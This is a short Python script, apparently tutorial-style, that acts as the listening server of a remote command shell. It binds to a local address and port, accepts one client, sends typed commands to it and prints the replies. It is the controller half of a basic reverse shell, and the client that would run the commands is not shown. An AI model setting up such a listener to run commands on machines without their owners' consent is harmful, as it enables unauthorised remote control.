import socket
import sys


# Function create a socket that connect two machines


def create_socket():
    try:
        global host
        global port
        global s
        port = 9999
        host = '192.168.0.12'
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish connection with a client and the socket must listening


def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! | " + "IP " + address[0] + ", port: " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands do client


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "UTF-8")
            print(client_response, end="")

# Main function


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()



